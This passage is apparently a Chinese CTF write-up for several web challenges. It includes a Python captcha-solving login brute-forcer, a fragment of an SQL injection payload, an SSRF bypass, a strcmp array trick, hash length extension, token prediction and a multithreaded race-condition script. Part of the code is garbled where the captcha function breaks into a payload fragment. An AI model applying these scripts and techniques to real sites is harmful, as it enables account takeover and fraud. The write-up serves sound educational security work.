    def login(name):
        url1=url+"check.php"
        try:
            for i in range(20):
                veri = verify()
                #print veri
                payload={'user':name,'pass':'111','verify':veri,'typer':'0','login':'%E7%99%BB%E9%99%86'}
                r=requests.post(url1,data=payload)
                txt=r.text
                #print txt
                if '2000' in txt:
                    print "login OK!!"
                    #print r.headers
                    headers['Cookie'] = r.headers['Set-Cookie']
                    v = setpic(headers)
                    if v:
                        return True
                        #sys.exit()
                    break
                else:
                    pass
                    #print "not login"
            return False
        except Exception, e:
            raise e
    def verify():
        url = "http://xxxxxx/verify.php"
        try:
            r=requests.get(url,headers=headers)
            i=Image.open(BytesIO(r.content))
            im = i.convert('L')
            threshold = 140
            table = []
            for i in range(256):
                if i 50/**/#'
注入成功得到密码后还是无法直接登陆。然后在robots.txt处有一个base32加密的提示，所以去想办法访问scret_new_notice.php（这里需要以local访问,通过头像处的ssrf,通过@的基础认证方式绕过），得到的提示是admin用户改变了自己的用户名。在这种情况下，由于用来判断的函数是strcmp()，因此传入数组为User[]=xxxx使其返回值为0，成功得到flag。
**  
**
**Web300 【你一定不能来这】**
感谢已毕业的phithon学长，部分思路来源于p总博客
首先在根目录下的crossdomain.xml发现隐藏的域名：
访问该域名后可下载一份download.php源码：
并发现可以利用hash长度扩展攻击下载得到www.rar。由于不知道secret长度，需要爆破。Secret长度为18，下载`www.rar`发现压缩包加密了，二进制观察压缩包发现文件尾有一串jjencode，拖入浏览器中可得一段培根密码，解密得到压缩包密码：
解压后进行代码审计，可以得到管理员邮箱。又发现要得到flag要重置id=0的用户的密码。而在php中id=0是会被判断为空的，而由于mysql的特性，会将0aa这样的字符串转成0.所以id=0aa即可进入第一个if。
接下来需要知道token，而token是时间戳加上rand(1,10000)，那么就需要预测服务器上的时间戳然后爆破1-10000。预测时间戳的话有两种方法：
1\. 本地直接time()取，这样的话需要减去网络延时。网络状况不稳定的话就容易造成较大误差。
2\.
通过获取http头的date字段获取服务器的准确时间（GMT），这样的话需要确定`php.ini`的时区设置（北京时间是GMT+8），得到时间戳后爆破即可。这里有一个坑点是，一个回合只能有一个队伍可以重置管理员密码，所以需要通过脚本竞争来进入爆破环节。
**Web 500 盘加加**
比较有趣的一个题目。
首先是登陆的部分，由于管理员的注册逻辑有错，pwd忘记加上md5()，导致无法正常登陆。这时注意到找回密码的地方，为4位数字验证码，因此直接通过脚本爆破。进入到ucenter后其中的调试脚本功能需要余额为99999以上才能使用，而初始提供给了用户33333积分，可以以1:1的形式进行兑换。
这里考察的是一个数据库不加锁情况下处理并发的业务逻辑问题，因此直接用时间竞争的方式，脚本多线程跑一下即可。脚本如下：
    # -*- coding:utf-8 -*-    import requests
    from time import sleep
    from threading import Thread
    class URLThread(Thread):
        def __init__(self, url,data,cookie, timeout=1, allow_redirects=True):
            super(URLThread, self).__init__()
            self.url = url
            self.timeout = timeout
            self.allow_redirects = allow_redirects
            self.response = None
            self.data=data
            self.cookies=cookies
        def run(self):
            try:
               self.response=requests.post(self.url,timeout=self.timeout,data=self.data,cookies=self.cookies)
                text=self.response.text